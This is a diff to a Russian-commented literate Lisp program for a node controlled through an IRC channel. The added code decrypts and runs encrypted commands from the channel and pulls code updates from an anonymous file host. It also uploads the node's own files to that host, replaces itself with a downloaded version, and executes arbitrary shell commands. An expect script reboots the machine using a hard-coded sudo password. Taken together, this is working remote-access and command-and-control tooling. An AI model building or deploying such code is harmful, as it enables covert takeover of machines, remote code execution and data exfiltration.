@@ -75,6 +75,8 @@
        (format t ,msg ,@params)
        (finish-output)))
 
+  (defparameter *max-diffs-cnt* 4)
+
   (defparameter *sleep-interval* 3)
 
   (defparameter *watchdog-timer* 0)
@@ -106,6 +108,15 @@
 
   ;; shot
   <<shot>>
+
+  ;; upload_code
+  <<upload_code>>
+
+  ;; replace_yourself
+  <<replace_yourself>>
+
+  ;; shell_command
+  <<shell_command>>
 
   (defparameter *supervisor*
     (lambda ()
@@ -422,12 +433,18 @@ irc-канала. Она должна возвращать T чтобы пред
 - CL-IRC:RECEIVED-TIME
 - CL-IRC:RAW-MESSAGE-STRING
 
-Из них нас интересует собственно команда размещенная в ~ARGUMENTS~.
+Из них нас интересует собственно команда размещенная в ~ARGUMENTS~. Мы
+прогоняем ее через функцию ~decode~, которая регуляркой разбивает команду
+на контрольную сумму (CRC32) и base64-кодированный код. Код
+расшифровывается с помощью ~decrypt~ и текущего ~seed~ а затем по нему
+вычисляется контрольная сумма. Если переданная контрольная сумма совпала
+с вычисленной - эта команда адресована нам, и мы ее выполняем.
 
 #+NAME: irc_cmd_proc
 #+BEGIN_SRC lisp :noweb yes
   ;; seq_xor
   <<seq_xor>>
+
   ;; ecrypt
   <<encrypt>>
 
@@ -537,17 +554,27 @@ irc-канала. Она должна возвращать T чтобы пред
             nil)))))
 #+END_SRC
 
-* Update
+* Update On Irc
 
 Чтобы удаленно расширять функциональность супервизора нам нужен способ
-обновить код. Это можно реализовать как выполнение команды ~UPDATE~,
-которая скачает файл с файлообменника и применит его к текущему образу.
+обновить код. В блоке кода [[irc_cmd_proc][irc_cmd_proc]] раздела [[*Command hook][Command hook]] опредено,
+как узел может выполнить команду. Так что теперь мы должны написать
+процедуру, которая эту команду сформирует.
 
-Для этого такой файл сначала нужно сформировать, загрузить и получить на
-него ссылку, например так:
+При этом мы ограничены размером IRC-сообщения, которое может быть не
+больше полукилобайта, поэтому сначала лучше закачать зашифрованное
+обновление на файлообменник и получить на него ссылку.
 
-#+BEGIN_SRC lisp
-  (defun upload (code key)
+Эту задачу берет на себя процедура ~upload-code~, ей нужен код,
+(представленный как строка) и ключ, чтобы зашифровать код (т.к. мы не
+хотим чтобы файлобменник мог его прочитать).
+
+Вызвать ~upload-code~ это задача оператора. ~upload-code~ возвращает
+ссылку на закачанный зашифрованный файл.
+
+#+NAME: upload_code
+#+BEGIN_SRC lisp :noweb yes
+  (defun upload-code (code key)
     (let* ((oct (flex:string-to-octets code :external-format :utf-8))
            (base64 (encrypt oct key))
            (filename (format nil "u-~A" (get-universal-time)))
@@ -558,29 +585,68 @@ irc-канала. Она должна возвращать T чтобы пред
                          nil)))
       link))
 
-  ;; (upload "(defun alfa () (print 1))" 1234567890)
+  ;; TEST for upload
+  ;; (upload-code "(defun alfa () (print 1))" 1234567890)
   ;; /t1TaCeD1ne/u-3784605289
 #+END_SRC
 
-После этого мы можем отправить команду вида:
+Теперь, когда есть ссылка, оператор может сформировать команду для
+отправки в irc-канал. Для этого он составляет из полученной на предыдущем
+этапе ссылки и ключа команду вида:
+
+#+BEGIN_EXAMPLE
+  "(update \"/t1TaCeD1ne/u-3784605289\" 1234567890)"
+#+END_EXAMPLE
+
+Но так как команда не посылается в канал в открытом виде - её надо
+зашифровать с помощью ~encode~
 
 #+BEGIN_SRC lisp
-  ;; (encode "(update \"/t1TaCeD1ne/u-3784605289\" 1234567890)" *irc-sess*)
-  ;; => s/2953b20b/612MB23XlKgQoLIZnl5bxmzNDMmMhKeBuP4efA8tmhDFQICSw7myuvAdKgYogQ==
+  ;; (encode "(update \"/t1TaCeD1ne/u-3784605289\" 1234567890)" 3784752939)
+  ;; => s/2953b20b/61gOM23BnHgQ+JFZnz7WxmlPOMmajHeB4N1efW+gmhVHdICEy2my4tNdK2algQ==
 #+END_SRC
 
-И проверить что она применилась:
+Полученную команду уже вполне можно посылать в канал и, если узел получил и
+выполнил команду, он вернет результат в канал, например так:
 
-#+BEGIN_SRC lisp
-  ;; (encode "(alfa)" *irc-sess*)
-  ;; => s/fd9145a6/60mQBW2K
+#+BEGIN_EXAMPLE
+  <b3784752939> => "ALFA"
+#+END_EXAMPLE
+
+Мы можем обьединить закачку кода и отправку команды в одну операцию, для
+удобства:
+
+#+NAME: upload_code_and_send
+#+BEGIN_SRC lisp :noweb yes
+  ;; seq_xor
+  <<seq_xor>>
+
+  ;; encrypt
+  <<encrypt>>
+
+  ;; anon_file_upload
+  <<anon_file_upload>>
+
+  ;; upload_code
+  <<upload_code>>
+
+  ;; encode
+  <<encode>>
+
+  (defun upload-code-and-send (code key seed)
+    (let* ((code-link (upload-code code key))
+           (cmd (format nil "(update \"~A\" ~A)" code-link key))
+           (enc (encode cmd seed)))
+      (sendmsg enc)))
+
+  ;; (upload-code-and-send "(alfa)" 1234567890 3784753813)
 #+END_SRC
 
-Узел должен выполнить ~ALFA~ и выдать в канал результат выполнения
-(число 1).
+В этом тестовом примере узел должен выполнить ~ALFA~ и выдать в канал
+результат выполнения (число 1).
 
-Чтобы все сработало нужно определить функцию ~UPDATE~, которая будет
-получать ссылку на файл с кодом, скачивать и расшифровывать его и
+Чтобы все сработало, ~на узле~ нужно определить функцию ~UPDATE~, которая
+будет получать ссылку на файл с кодом, скачивать и расшифровывать его а потом
 применять:
 
 #+NAME: update
@@ -600,8 +666,361 @@ irc-канала. Она должна возвращать T чтобы пред
       result))
 
   ;; (update "/3444C7Dbna/u-3784602724" 1234567890)
+#+END_SRC
 
-  ;; (update "/3444C7Dbna/u-3784602724" 1234567890)
+** File obtaining
+
+Воспользуемся этим механизмом, чтобы сформировать какую-то новую
+функциональность, которая не была определена ранее. Например, попросим
+узел загрузить на файлообменник какой-нибудь файл.
+
+Для этого надо определить процедуру, которую у оператора уже есть -
+~upload-code~ (она определена в разделе выше). Но эта процедура не
+включена в код супервизора, исполняющийся на удаленной машине (поправка:
+в новом релизе - уже включена, но неважно). Эта процедура вызывает внутри
+себя ~encrypt~ и ~anon-file-upload~, которые уже на удаленном узле
+определены.
+
+Чтобы отослать нам понадобится текущий ~seed~ получателя, который мы
+можем взять из его сообщений в канале и сохранить в переменную
+*receiver*. Также определим ключ, чтобы закрыть код от файлообменника.
+
+Формируем строку и отсылаем:
+
+#+BEGIN_SRC lisp
+  (defparameter *receiver* 3784758144)
+  (defparameter *tmpkey* 1234567890)
+
+  (upload-code-and-send
+   "(defun upload-code (code key)
+    (let* ((oct (flex:string-to-octets code :external-format :utf-8))
+           (base64 (encrypt oct key))
+           (filename (format nil \"u-~A\" (get-universal-time)))
+           (result   (cl-json:decode-json-from-string
+                      (anon-file-upload filename base64)))
+           (link     (if (cdr (assoc :status result))
+                         (subseq (cdadr (cadadr (assoc :data result))) 20)
+                         nil)))
+      link))"
+   ,*tmpkey*
+   ,*receiver*)
+#+END_SRC
+
+Теперь, вызвав свежеопределенную процедуру, мы можем закачать собственный
+код на файлообменник и получить на него ссылку:
+
+#+BEGIN_SRC lisp
+  (defparameter *receiver* 3784758144)
+  (defparameter *tmpkey* 1234567890)
+
+  (upload-code-and-send
+   (format
+    nil
+    "(upload-code (alexandria:read-file-into-string \"q.lisp\") ~A)"
+    ,*tmpkey*)
+   ,*tmpkey*
+   ,*receiver*)
+#+END_SRC
+
+По этой ссылке скачать файл себе и расшировать его:
+
+#+NAME: download_and_decrypt
+#+BEGIN_SRC lisp
+  (defun download-and-decrypt (link key)
+    (flex:octets-to-string
+     (decrypt
+      (anon-file-download link)
+      key)
+     :external-format :utf-8))
+
+  ;; (upload-code
+  ;;  (alexandria:read-file-into-string "q.lisp\"")
+
+  ;; (download-and-decrypt "/some/link" *tmpkey*)
+#+END_SRC
+
+** Replace yourself
+
+Теперь выполним обратную операцию - загрузим файл на узел - например
+новую версию себя:
+
+#+NAME: replace_yourself
+#+BEGIN_SRC lisp :noweb yes
+  <<download_and_decrypt>>
+
+  (defun replace-yourself (link key)
+    (alexandria:write-string-into-file
+     (download-and-decrypt link key)
+     "q.lisp" :if-exists :supersede)
+    'ok)
+
+  ;; (upload-code (alexandria:read-file-into-string "q.lisp") 1234567890)
+  ;; => "/some/file"
+
+  ;; (defparameter *receiver* 3784783570)
+  ;; (defparameter *tmpkey* 1234567890)
+
+  ;; (upload-code-and-send
+  ;;  "(replace-yourself \"/some/file\" 1234567890)"
+  ;;  *tmpkey*
+  ;;  *receiver*)
+#+END_SRC
+
+** Run program
+
+Аналогичным образом добавляем возможность запускать команды на удаленном
+узле. Следует помнить, что запуск полностью синхронный, поэтому следует
+добавлять амперсанд (&) в конце команды, чтобы не ждать ее завершения.
+
+#+NAME: shell_command
+#+BEGIN_SRC lisp
+  (defvar *shell-search-paths* '("/usr/bin/" "/usr/local/bin/"))
+
+  (defparameter *bourne-compatible-shell* "/bin/sh"
+    "The path to a Bourne compatible command shell in
+  physical pathname notation.")
+
+  (defun directory-pathname-p (pathname)
+    "Does `pathname` syntactically  represent a directory?
+    ---
+    A directory-pathname is a pathname _without_ a filename. The three
+    ways that the filename components can be missing are for it to be `nil`,
+    `:unspecific` or the empty string.
+    "
+    (flet ((check-one (x)
+             (not (null (member x '(nil :unspecific "")
+                                :test 'equal)))))
+      (and (check-one (pathname-name pathname))
+           (check-one (pathname-type pathname)))))
+
+  (defmacro with-gensyms (syms &body body)
+    `(let ,(mapcar #'(lambda (s)
+                       `(,s (gensym)))
+                   syms)
+       ,@body))
+
+  (defmacro with-stream-from-specifier ((stream)
+                                        &body body)
+    (with-gensyms (s close? result)
+      `(let ((,close? t)
+             ,s
+             ,result)
+         (unwind-protect
+              (setf ,result
+                    (multiple-value-list
+                     (let (,stream)
+                       (setf (values ,s ,close?)
+                             nil)
+                       (setf ,stream ,s)
+                       ,@body)))
+           (when (and ,close? ,s)
+             (let ((it (close-stream-specifier ,s)))
+               (when it
+                 (setf (first ,result) it)))))
+         (values-list ,result))))
+
+  (defmacro with-input ((var) &body body)
+    "Create an input stream from source and bind it to var within the body of the with-input form. The stream will be closed if necessary on exit."
+    `(with-stream-from-specifier (,var)
+       ,@body))
+
+  (defun close-stream-specifier (s)
+    (if (equal (type-of s) 'string-stream)
+        (prog1
+            (values (get-output-stream-string s))
+          (close s))
+        ;; else
+        (progn
+          (close s)
+          (values nil))))
+
+  (defun file-to-string-as-lines (stream)
+    (with-output-to-string (s)
+      (loop for line = (read-line stream nil :eof nil)
+         until (eq line :eof) do
+           (princ line s)
+           (terpri s))))
+
+  (defun %shell-command (command)
+    (with-input (input-stream)
+      (let* ((process (sb-ext:run-program
+                       ,*bourne-compatible-shell*
+                       (list "-c" command)
+                       :wait nil :input input-stream
+                       :output :stream
+                       :error :stream))
+             (output-thread (sb-thread:make-thread
+                             #'(lambda ()
+                                 (file-to-string-as-lines
+                                  (sb-impl::process-output process)))))
+             (error-thread (sb-thread:make-thread
+                            #'(lambda ()
+                                (file-to-string-as-lines
+                                 (sb-impl::process-error process))))))
+        (let ((error-code
+               (sb-impl::process-exit-code (sb-impl::process-wait process)))
+              (output-string (sb-thread:join-thread output-thread))
+              (error-string (sb-thread:join-thread error-thread)))
+          (close (sb-impl::process-output process))
+          (close (sb-impl::process-error process))
+          (values output-string error-string error-code)))))
+
+  (defun find-command-ending-in-string (command)
+    (let ((checking? t))
+      (loop for ch across command
+         for i from 0 do
+           (cond ((and checking? (char= ch #\Space))
+                  (return i))
+                 ((char= ch #\\)
+                  (setf checking? nil))
+                 (t
+                  (setf checking? t))))))
+
+
+  (defun shell-command (command)
+    "Synchronously execute `command` using a Bourne-compatible shell,
+     returns (values output error-output exit-status).
+     --
+     The `command` can be a full path to a shell executable binary
+     or just its name. In the later case, the variable `*shell-search-paths*`
+     will be used to find the executable.
+     --
+     Depending on the implementation, the variable `*bourne-compatible-shell*`
+     may be used to find a shell to use in executing `command`."
+    (let* ((pos-/ (position #\/ command))
+           (pos-space (find-command-ending-in-string command))
+           (binary (subseq command 0 (or pos-space)))
+           (args (and pos-space (subseq command pos-space))))
+      (when (or (not pos-/)
+                (and pos-/ pos-space)
+                (and pos-space
+                     (< pos-/ pos-space)))
+        ;; no slash in the command portion, try to find the command with
+        ;; our path
+        (setf binary
+              (or (loop for path in *shell-search-paths* do
+                       (let ((full-binary (make-pathname :name binary
+                                                         :defaults path)))
+                         (when (and (probe-file full-binary)
+                                    (directory-pathname-p full-binary))
+                           (return full-binary))))
+                  binary)))
+      (multiple-value-bind (output error status)
+          (%shell-command (format nil "~a~@[ ~a~]" binary args))
+        (values output error status))))
+#+END_SRC
+
+Тут приведен пример запуска, написанный в расчете на то, что предыдущий
+блок упакован в строку, размещенную в переменной ~*CODE*~.
+
+Также есть примеры запуска на удаленном узле
+- броузера (как пример GUI-программы которая есть везде)
+- команды которая используется, чтобы понять, запущен ли броузер (она
+  подсчитывает процессы с именами "firefox")
+- закрытия броузера (как пример завершения процессов, запущенных
+  асинхронно)
+- проверки определена ли процедура (так можно определять, какие features
+  поддерживаются в этой инсталляции супервизора узла в текущий момент)
+- удаления определения процедуры (оно необходимо, т.к. без него
+  переопределение ловится процедурой игнорирования ошибки)
+
+#+BEGIN_SRC lisp
+  (defparameter *receiver* 3784780565)
+
+  (defparameter *tmpkey* 3784780565)
+
+  (upload-code-and-send
+   ,*code*
+   ,*tmpkey*
+   ,*receiver*)
+
+  (upload-code-and-send
+   "(uiop:run-program \"firefox &\")"
+   ,*tmpkey*
+   ,*receiver*)
+
+  (upload-code-and-send
+   "(shell-command \"ps aux | grep firefox | wc -l\")"
+   ,*tmpkey*
+   ,*receiver*)
+
+  (upload-code-and-send
+   "(shell-command \"killall firefox\")"
+   ,*tmpkey*
+   ,*receiver*)
+
+  (upload-code-and-send
+   "(fboundp 'shell-command)"
+   ,*tmpkey*
+   ,*receiver*)
+
+  (upload-code-and-send
+   "(setf *sleep-interval* 300)"
+   ,*tmpkey*
+   ,*receiver*)
+
+
+
+  (upload-code-and-send
+   "(fmakunbound 'shell-command)"
+   ,*tmpkey*
+   ,*receiver*)
+#+END_SRC
+
+** Shutdown
+
+Чтобы выполнить перезагрузку воспользуемся ~EXPECT~. Скрипт будет таким:
+
+#+NAME:
+#+BEGIN_SRC tcl
+  #!/usr/bin/expect -d
+  spawn sudo reboot
+  sleep 3
+  expect {\[sudo\] ?assword* }
+  send "rfhfrfnbwf\r"
+  sleep 3
+#+END_SRC
+
+Вот последовательность команд, которую нужно исполнить, чтобы загрузить и
+выполнить скрипт перезагрузки на узле. Следует помнить, что после
+перезагрузки узел не выйдет в сеть, если на нем не установлен автологин.
+
+#+BEGIN_SRC lisp
+  (defparameter *receiver* 3784776109)
+
+  (defparameter *tmpkey* 1234567890)
+
+  (defparameter *code*
+    "(alexandria:write-string-into-file
+     \"#!/usr/bin/expect -d
+     spawn sudo reboot
+     sleep 3
+     expect {\\[sudo\\] ?assword* }
+     send \\\"rfhfrfnbwf\\\\r\\\"
+     sleep 3
+     \"
+     \"rbt.sh\" :if-exists :supersede)
+  ")
+
+  (upload-code-and-send
+   ,*code*
+   ,*tmpkey*
+   ,*receiver*)
+
+  (upload-code-and-send
+   "(shell-command \"ls -la| grep rbt\")"
+   ,*tmpkey*
+   ,*receiver*)
+
+  (upload-code-and-send
+   "(shell-command \"chmod +x rbt.sh\")"
+   ,*tmpkey*
+   ,*receiver*)
+
+  (upload-code-and-send
+   "(shell-command \"./rbt.sh\")"
+   ,*tmpkey*
+   ,*receiver*)
 #+END_SRC
 
 * Snapshot function
@@ -709,7 +1128,7 @@ irc-канал.
       (declare (inline get-img-diff))
       (let* ((snap (pack-img (x-snapshot)))
              (dims (array-dimensions snap)))
-        (if (> cnt 4)
+        (if (> cnt *max-diffs-cnt*)
             (progn ;; key frame
               (wrap-img "~A" dims snap)
               (setf prev snap)
@@ -1081,7 +1500,7 @@ irc-канал.
 Наблюдать за узлом сети и отправлять команды очень увлекательно, но
 хочется добавить автоматизации. Например, если глупый робот-пылесос умеет
 посылать в канал сообщение о том, что батарея разряжается, то умная
-программа-оператор, сидящий в irc-канале может начать с ним диалог, чтобы
+программа-оператор, сидящая в irc-канале может начать с ним диалог, чтобы
 довести его до зарядной станции.
 
 Для этого оператору нужно только уметь принимать сообщения и декодировать
@@ -1114,6 +1533,8 @@ irc-канал.
   (defparameter *op-connection-established-flag* nil)
 
   <<op_loop>>
+
+  <<upload_code_and_send>>
 
   (defun operator ()
     (setf *op-sess* (get-universal-time))
@@ -1226,7 +1647,7 @@ irc-канал.
                      (when (funcall consequent str src)
                        (return-from op-rules-dispatcher nil))))
               (when (> 0 applyed_rules)
-                (dbg "::UNKMSG [~A] from [~A]~%" str))
+                (dbg "::UNKMSG [~A] from [~A]~%" str src))
               (finish-output)))
           ))))
 #+END_SRC
@@ -1241,8 +1662,8 @@ irc-канал.
     (declare (ignore src))
     (ppcre:scan-to-strings "^/.*/[0-9]*(_[0-9])?$" str))
 
-  ;; download
-  <<download>>
+  ;; anon_file_download
+  <<anon_file_download>>
 
   ;; seq_xor
   <<seq_xor>>
@@ -1299,7 +1720,7 @@ irc-канал.
     t)
 #+END_SRC
 
-** Download
+** Anon File Download
 
 #+NAME: anon_file_download
 #+BEGIN_SRC lisp :noweb yes
@@ -1688,6 +2109,7 @@ SIMD-операций.
   (ql:quickload "prbs")
   (ql:quickload "cl-irc")
   (ql:quickload "cl-json")
+  (ql:quickload "ironclad")
 
   <<operator>>
 #+END_SRC
